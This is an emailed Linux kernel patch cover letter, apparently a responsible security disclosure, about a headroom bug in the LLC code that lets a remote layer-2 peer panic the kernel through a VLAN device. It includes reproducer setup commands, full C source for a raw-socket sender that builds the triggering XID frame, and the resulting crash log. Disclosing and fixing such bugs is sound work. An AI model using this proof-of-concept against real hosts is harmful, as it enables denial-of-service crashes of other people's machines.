Received: from mail-pj2-f13.google.com (mail-pj2-f13.google.com [74.125.227.141])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 92F164BE452
	for <netdev@vger.kernel.org>; Tue, 22 Sep 2026 09:42:26 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=74.125.227.141
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1790070148; cv=none; b=tV3ve1NARtwuPIMKhvnKtH4a5vyV8rWv+vVFhdHCCllPBVWsM7i2+6DOyGExYGsXeEb067PtuPHhF2z1cZj4K7nW30TNh+Hp6Mc4fCZp9PqtSzyd3FpJBWmvQjHaXKKJhRHt20gEUg1abEOJx+YowHmoTnHLTBGuE3KhXf3ewtg=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1790070148; c=relaxed/simple;
	bh=8dHiXV84nYcYSE1CRfo3xs3C2TEe2+S0ZlyT6cRTT+4=;
	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=K+elqkrM2SI3nxNbAXmV5h7zkODrYzxp7+xk3qAVYP/q0p2TOCb4905gmgMwM3FSnUCyWJsk4w3Q5jPe9kdIhDxIl3MDeeve0G3Pjth8nVnNfADt+sDmVVnbkvREcZ8nIeCLf0S9yNzyl0reaPN3RZRmIQfr83720PxhVc6DZeU=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=XH2kKDeD; arc=none smtp.client-ip=74.125.227.141
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="XH2kKDeD"
Received: by mail-pj2-f13.google.com with SMTP id d9443c01a7336-2dd88a115ebso34710575ad.2
        for <netdev@vger.kernel.org>; Tue, 22 Sep 2026 02:42:26 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=nebusec.ai; s=google; t=1790070146; x=1790674946; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=rM/bCYFp19ubNNMJgsOiqYCGsUtyT3MrkQRf8P6aEnM=;
        b=XH2kKDeD04JX8fBcgSIUx+VVrq5iIoJDswOLiQ5XYmAxhyBWhx78hNndwA1naJqfVt
         B4bcqzr5be9XWPsFUmDrwqeTSD1cGCbrltQMyRh+Egzp5K6AD2zMTuGNXwbx9XMKDNzO
         5NNVh6dieZN8JIm2YiJS0YvIB5UFMzcYfAVBzDmNJi2pHdrgdcY5VfEgr9HcCqWdb+Sn
         Z7ZxfPhnZi99mlbrHJh7CB0/dGefKn2UQSbTA4u7SOr459PfJI+q86Nfu2q01DVbmjov
         bB/PfwgUtgFMHGw8z7PdFkb3GYz6fgqMyzWdB0Nxp9U5BPbryTT9eF8q0us+cHYaMUsB
         unCg==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20260707; t=1790070146; x=1790674946;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=rM/bCYFp19ubNNMJgsOiqYCGsUtyT3MrkQRf8P6aEnM=;
        b=P9C2Y1DFBNf9fLENm3r5ATQw1Hc6c92If0y0EP8WLEOzOKMA/clEdQjGxB2pzJfHol
         wajrwH6Rl9dJ17F3SNJH3THnOGWu03MB3a19tV6XkXzWTy1FigELWjOB+DjKQfO0e0Wl
         gr34yivam+HFd9zNc8FCKNhYJwrsa7ratM5ZAZ8+5R7VyxaClTB2nfvf5R9Gz1Kf18Nt
         /WP7Ld7yPFg9Y+q+4alCmu3cHqAoQH/4xRAjc6/mqFuF2ugIYPwphT/ep4auFEMBGcZr
         YSg0cIkLQJ6Uemu4YxCUStEYUBFeGWr3TTD8u2MIo5q94nJATm3LJc56SfLc32Uj/h6h
         qexA==
X-Gm-Message-State: AFuF++knsT308ZGiBmgUHdArag0zcFGyF5wSltMN4ClTLf68d/YTFRZM
	VL+n5wVohnk692Z77nIy9Rc7ehwv3RhyzTkjwBrwg51yjPtOJ3aAalMcKtFeGQRPCVm18w/zy+d
	MWHMRQJMF
X-Gm-Gg: AYBFou1ghrbxwwDBJ7/gOqR4mMED0BjUhkWimpLKt7EtZY/Sgrm+B6MjZyJRrtEESN2
	pni8Yn7tJsBlDdBtZxCY7Yda1gW/dcD8dmsnwtelpM+NUOowLABV+KC7GAIFFqaeNsrgIq2h4dQ
	WU66iAyHKyI20nV+lYDNS4AFH/RUBIVIbzZh+oawTuLk6GmOEmM5dR5s70cW8bbIbted13ZpSYP
	KNcA5FFD5aAjlBBSXSJqhTx1GL4zk+YhbNFtaW1YHHOS4951gaTdiotZJB5qsH0uWycPbaYNsOJ
	U+tvWNYLr1N27Y1HwuU4tBS7q6DEHfhgCrSvV+3JCV3mlyAWLfG6U1CU6O+piSyfJKQX74glYz7
	ahPXDVDEzaSW9VZisIbCesuqg03w19sukAhRgrMADBaOhAyNpZ16qX480WtlzwF3ANo4ZH7HVk0
	M55Y9JlU9I2vd38GMX5E+6FvZB84dBlDEewQRfADc2ZqB7SJFJHp1SCeU5LLYuhumIyHgJ3S3me
	cjYFAog
X-Received: by 2002:a17:903:22cb:b0:2dd:ad74:ac30 with SMTP id d9443c01a7336-2df60ad789bmr7230985ad.25.1790070145426;
        Tue, 22 Sep 2026 02:42:25 -0700 (PDT)
Received: from enjou-Legion-Y7000P-2019 ([167.71.204.91])
        by smtp.gmail.com with ESMTPSA id d9443c01a7336-2df5d056911sm6799025ad.70.2026.09.22.02.42.17
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Tue, 22 Sep 2026 02:42:25 -0700 (PDT)
From: Ren Wei <weir@nebusec.ai>
To: netdev@vger.kernel.org
Cc: davem@davemloft.net,
	edumazet@google.com,
	kuba@kernel.org,
	pabeni@redhat.com,
	horms@kernel.org,
	tim.bird@sony.com,
	opurdila@ixiacom.com,
	vega@nebusec.ai,
	petalzu987@gmail.com,
	weir@nebusec.ai
Subject: [PATCH net 0/1] llc: reserve device headroom for allocated frames
Date: Tue, 22 Sep 2026 17:41:53 +0800
Message-ID: <cover.1789987105.git.petalzu987@gmail.com>
X-Mailer: git-send-email 2.53.0
Precedence: bulk
X-Mailing-List: netdev@vger.kernel.org
List-Id: <netdev.vger.kernel.org>
List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

From: Zixuan Chai <petalzu987@gmail.com>

Hi Linux kernel maintainers,

We found and validated an issue in net/llc/llc_sap.c.

llc_mac_hdr_init() invokes the selected Ethernet device's header_ops
without verifying that the skb has enough headroom for the device's actual
link-layer header. LLC2 response paths allocate frames through
llc_alloc_frame(), which reserves only ETH_HLEN bytes for every
ARPHRD_ETHER device. On a non-offloaded VLAN device, vlan_dev_hard_header()
instead pushes a four-byte VLAN header followed by the lower device's
Ethernet header. After the LLC header consumes its reservation, the
Ethernet push crosses skb->head and invokes skb_under_panic(). With
CONFIG_LLC2 enabled, a remote layer-2 peer can send a NULL-DSAP XID or TEST
command through such a VLAN and make the automatic station response crash
the kernel.

The fix replaces the device-type-specific header length with
LL_RESERVED_SPACE(dev), preserving the LLC header reservation while
accounting for stacked device headers.

Reproducer:

Run the following commands as root in the QEMU guest. They create the
veth/VLAN/macvlan topology, build the sender, and transmit one VLAN LLC XID
frame:

	ip link add vethA type veth peer name vethB
	ethtool -K vethA tx-vlan-offload off
	ethtool -K vethB tx-vlan-offload off

	ip link add link vethA name vethA.100 type vlan id 100
	ip link set vethA.100 type vlan reorder_hdr off
	ip link add link vethB name vethB.100 type vlan id 100
	ip link set vethB.100 type vlan reorder_hdr off

	# A macvlan child suppresses RX tag reinsertion on vethA.100 while
	# unmatched unicast frames still stay on the lower VLAN device.
	ip link add link vethA.100 name mv0 type macvlan mode bridge

	ip link set vethA up
	ip link set vethB up
	ip link set vethA.100 up
	ip link set vethB.100 up
	ip link set mv0 up

	cc -O2 -Wall -Wextra -o /tmp/llc-vlan-sender \
	    /tmp/llc-vlan-sender.c
	/tmp/llc-vlan-sender

We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.

------BEGIN PoC------

#define _GNU_SOURCE

#include <arpa/inet.h>
#include <linux/if_packet.h>
#include <linux/if_ether.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <unistd.h>

#include <stdio.h>
#include <string.h>

int main(void)
{
	unsigned char frame[60] = { 0 };
	struct ifreq ifr;
	struct sockaddr_ll addr;
	int fd;

	fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
	if (fd < 0) {
		perror("socket");
		return 1;
	}

	memset(&ifr, 0, sizeof(ifr));
	strncpy(ifr.ifr_name, "vethA", IFNAMSIZ - 1);
	if (ioctl(fd, SIOCGIFHWADDR, &ifr) < 0) {
		perror("vethA");
		return 1;
	}
	memcpy(frame, ifr.ifr_hwaddr.sa_data, ETH_ALEN);

	memset(&ifr, 0, sizeof(ifr));
	strncpy(ifr.ifr_name, "vethB", IFNAMSIZ - 1);
	if (ioctl(fd, SIOCGIFHWADDR, &ifr) < 0) {
		perror("vethB");
		return 1;
	}
	memcpy(frame + ETH_ALEN, ifr.ifr_hwaddr.sa_data, ETH_ALEN);

	/* 802.1Q VLAN header, VLAN ID 100. */
	frame[12] = 0x81;
	frame[13] = 0x00;
	frame[14] = 0x00;
	frame[15] = 0x64;

	/* LLC XID payload. */
	frame[16] = 0x00;
	frame[17] = 0x06;
	frame[18] = 0x00;
	frame[19] = 0x00;
	frame[20] = 0xbf;
	frame[21] = 0x81;
	frame[22] = 0x00;
	frame[23] = 0x00;

	memset(&addr, 0, sizeof(addr));
	addr.sll_family = AF_PACKET;
	addr.sll_protocol = htons(ETH_P_ALL);
	addr.sll_ifindex = if_nametoindex("vethB");
	addr.sll_halen = ETH_ALEN;
	memcpy(addr.sll_addr, frame, ETH_ALEN);

	if (sendto(fd, frame, sizeof(frame), 0,
		   (struct sockaddr *)&addr, sizeof(addr)) < 0) {
		perror("sendto");
		return 1;
	}

	puts("sent VLAN LLC XID frame");
	return 0;
}

------END PoC--------

----BEGIN crash log----

[  168.080941][    C1] skbuff: skb_under_panic: text:ffffffff898c83c7 len:24 put:14 head:ff11000037a4d6c0 data:ff11000037a4d6bc tail:0x14 end:0x180 dev:vethA.100
[  168.082215][    C1] ------------[ cut here ]------------
[  168.082229][    C1] kernel BUG at net/core/skbuff.c:214!
[  168.082320][    C1] Oops: invalid opcode: 0000 [#1] SMP KASAN NOPTI
[  168.088321][    C1] CPU: 1 UID: 0 PID: 9462 Comm: llc-vlan-sender Not tainted 7.3.0-rc3-00344-g1e24c4f2ee44 #1 PREEMPT(full) 
[  168.090309][    C1] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.15.0-1 04/01/2014
[  168.091796][    C1] RIP: 0010:skb_panic+0x157/0x1d0
[  168.094877][    C1] Code: b6 04 01 84 c0 74 04 3c 03 7e 21 41 56 8b 4b 70 45 89 e8 48 c7 c7 e0 98 f9 8c 41 57 56 48 89 ee 52 4c 89 e2 e8 3a fb 3c f8 90 <0f> 0b 4c 89 4c 24 10 48 89 54 24 08 48 89 34 24 e8 b4 b6 d0 f8 4c
[  168.097867][    C1] RSP: 0018:ffa00000001c89a0 EFLAGS: 00010282
[  168.098774][    C1] RAX: 000000000000008a RBX: ff1100004b938c80 RCX: 0000000000000101
[  168.099945][    C1] RDX: 0000000000000000 RSI: ffffffff819fd610 RDI: 0000000000000007
[  168.101104][    C1] RBP: ffffffff8cf9bbc0 R08: 0000000000000101 R09: fff3fc00000390ee
[  168.102247][    C1] R10: 8000000000000101 R11: 0000000000000000 R12: ffffffff898c83c7
[  168.103336][    C1] R13: 000000000000000e R14: ff1100004b9fc120 R15: 0000000000000180
[  168.104466][    C1] FS:  00007fdd92b1e540(0000) GS:ff110000d597b000(0000) knlGS:0000000000000000
[  168.105708][    C1] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[  168.106601][    C1] CR2: 00005608f6598011 CR3: 000000004dad0000 CR4: 0000000000753ef0
[  168.107647][    C1] PKRU: 55555554
[  168.108128][    C1] Call Trace:
[  168.108583][    C1]  <IRQ>
[  168.108980][    C1]  ? find_held_lock+0x2b/0x80
[  168.109635][    C1]  ? eth_header+0x37/0x200
[  168.110234][    C1]  skb_push+0xcc/0xf0
[  168.110753][    C1]  eth_header+0x37/0x200
[  168.111307][    C1]  ? __pfx_eth_header+0x10/0x10
[  168.111935][    C1]  vlan_dev_hard_header+0x13c/0x410
[  168.112606][    C1]  ? __pfx_vlan_dev_hard_header+0x10/0x10
[  168.113333][    C1]  llc_mac_hdr_init+0x12a/0x190
[  168.113951][    C1]  llc_station_rcv+0x5f4/0xee0
[  168.114520][    C1]  ? stack_trace_save+0x8e/0xc0
[  168.115090][    C1]  ? __pfx_llc_station_rcv+0x10/0x10
[  168.115713][    C1]  ? __pfx_llc_station_rcv+0x10/0x10
[  168.116328][    C1]  llc_rcv+0x9d8/0xc20
[  168.116814][    C1]  ? __pfx_llc_rcv+0x10/0x10
[  168.117362][    C1]  __netif_receive_skb_one_core+0x1b4/0x1e0
[  168.118049][    C1]  ? __pfx___netif_receive_skb_one_core+0x10/0x10
[  168.118763][    C1]  ? process_backlog+0x330/0x1540
[  168.119334][    C1]  ? process_backlog+0x330/0x1540
[  168.119901][    C1]  __netif_receive_skb+0x1d/0x160
[  168.120483][    C1]  process_backlog+0x382/0x1540
[  168.121037][    C1]  __napi_poll.constprop.0+0xb3/0x540
[  168.121651][    C1]  net_rx_action+0x9b1/0xea0
[  168.122172][    C1]  ? __pfx_net_rx_action+0x10/0x10
[  168.122724][    C1]  ? kvm_sched_clock_read+0x16/0x30
[  168.123285][    C1]  ? sched_clock+0x39/0x60
[  168.123765][    C1]  ? sched_clock_cpu+0x6c/0x550
[  168.124288][    C1]  ? __pfx_sched_clock_cpu+0x10/0x10
[  168.124858][    C1]  ? __pfx_sched_clock_cpu+0x10/0x10
[  168.125422][    C1]  ? __dev_queue_xmit+0xe49/0x4350
[  168.125992][    C1]  handle_softirqs+0x1d3/0x990
[  168.126495][    C1]  ? __dev_queue_xmit+0xe49/0x4350
[  168.127004][    C1]  do_softirq+0xad/0xe0
[  168.127436][    C1]  </IRQ>
[  168.127725][    C1]  <TASK>
[  168.128018][    C1]  __local_bh_enable_ip+0x109/0x130
[  168.128545][    C1]  ? __dev_queue_xmit+0xe49/0x4350
[  168.129064][    C1]  __dev_queue_xmit+0xe5e/0x4350
[  168.129563][    C1]  ? __might_fault+0x138/0x190
[  168.130051][    C1]  ? __pfx___dev_queue_xmit+0x10/0x10
[  168.130588][    C1]  ? __might_fault+0xe0/0x190
[  168.131049][    C1]  ? __sanitizer_cov_trace_switch+0x54/0x90
[  168.131624][    C1]  ? __vlan_get_protocol_offset+0x232/0x330
[  168.132202][    C1]  ? __pfx___vlan_get_protocol_offset+0x10/0x10
[  168.132801][    C1]  ? __pfx_ref_tracker_alloc+0x10/0x10
[  168.133955][    C1]  ? packet_parse_headers+0x29e/0x840
[  168.134470][    C1]  ? __pfx_packet_parse_headers+0x10/0x10
[  168.135005][    C1]  packet_xmit+0x247/0x370
[  168.135432][    C1]  packet_sendmsg+0x2e91/0x4ca0
[  168.135900][    C1]  ? sock_has_perm+0x21f/0x2c0
[  168.136358][    C1]  ? __pfx_sock_has_perm+0x10/0x10
[  168.136840][    C1]  ? __sanitizer_cov_trace_switch+0x54/0x90
[  168.137399][    C1]  ? __pfx_packet_sendmsg+0x10/0x10
[  168.137892][    C1]  ? selinux_socket_sendmsg+0x18f/0x2e0
[  168.138407][    C1]  ? __pfx_packet_sendmsg+0x10/0x10
[  168.138880][    C1]  __sys_sendto+0x4c3/0x510
[  168.139307][    C1]  ? __pfx___sys_sendto+0x10/0x10
[  168.139782][    C1]  ? fput_close_sync+0x114/0x210
[  168.140240][    C1]  ? __pfx_fput_close_sync+0x10/0x10
[  168.140720][    C1]  ? dnotify_flush+0x79/0x4c0
[  168.141157][    C1]  __x64_sys_sendto+0xe0/0x1c0
[  168.141601][    C1]  ? lockdep_hardirqs_on+0x7d/0x110
[  168.142070][    C1]  do_syscall_64+0x128/0x7b0
[  168.142484][    C1]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
[  168.142995][    C1] RIP: 0033:0x7fdd92a46046
[  168.143383][    C1] Code: 0e 0d 00 f7 d8 64 89 02 48 c7 c0 ff ff ff ff eb b8 0f 1f 00 41 89 ca 64 8b 04 25 18 00 00 00 85 c0 75 11 b8 2c 00 00 00 0f 05 <48> 3d 00 f0 ff ff 77 72 c3 90 55 48 83 ec 30 44 89 4c 24 2c 4c 89
[  168.145004][    C1] RSP: 002b:00007ffdf2380348 EFLAGS: 00000246 ORIG_RAX: 000000000000002c
[  168.145729][    C1] RAX: ffffffffffffffda RBX: 00007ffdf2380378 RCX: 00007fdd92a46046
[  168.146407][    C1] RDX: 000000000000003c RSI: 00007ffdf23803a0 RDI: 0000000000000003
[  168.147082][    C1] RBP: 0000000000000003 R08: 00007ffdf2380350 R09: 0000000000000014
[  168.147764][    C1] R10: 0000000000000000 R11: 0000000000000246 R12: 00007ffdf2380350
[  168.148436][    C1] R13: 00007ffdf23803a0 R14: 0000000000000000 R15: 0000000000000000
[  168.149128][    C1]  </TASK>
[  168.149396][    C1] Modules linked in:
[  168.149810][    C1] ---[ end trace 0000000000000000 ]---
[  168.150290][    C1] RIP: 0010:skb_panic+0x157/0x1d0
[  168.150305][    C1] Code: b6 04 01 84 c0 74 04 3c 03 7e 21 41 56 8b 4b 70 45 89 e8 48 c7 c7 e0 98 f9 8c 41 57 56 48 89 ee 52 4c 89 e2 e8 3a fb 3c f8 90 <0f> 0b 4c 89 4c 24 10 48 89 54 24 08 48 89 34 24 e8 b4 b6 d0 f8 4c
[  168.150333][    C1] RSP: 0018:ffa00000001c89a0 EFLAGS: 00010282
[  168.150344][    C1] RAX: 000000000000008a RBX: ff1100004b938c80 RCX: 0000000000000101
[  168.150351][    C1] RDX: 0000000000000000 RSI: ffffffff819fd610 RDI: 0000000000000007
[  168.150359][    C1] RBP: ffffffff8cf9bbc0 R08: 0000000000000101 R09: fff3fc00000390ee
[  168.150366][    C1] R10: 8000000000000101 R11: 0000000000000000 R12: ffffffff898c83c7
[  168.150374][    C1] R13: 000000000000000e R14: ff1100004b9fc120 R15: 0000000000000180
[  168.150381][    C1] FS:  00007fdd92b1e540(0000) GS:ff110000d597b000(0000) knlGS:0000000000000000
[  168.150394][    C1] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[  168.150401][    C1] CR2: 00005608f6598011 CR3: 000000004dad0000 CR4: 0000000000753ef0
[  168.150409][    C1] PKRU: 55555554
[  168.150415][    C1] Kernel panic - not syncing: Fatal exception in interrupt
[  168.160398][    C1] Kernel Offset: disabled
[  168.160776][    C1] Rebooting in 86400 seconds..

-----END crash log-----

Best regards,
Zixuan Chai

Zixuan Chai (1):
  llc: reserve device headroom for allocated frames

 net/llc/llc_sap.c | 12 +-----------
 1 file changed, 2 insertions(+), 12 deletions(-)

--
2.34.1
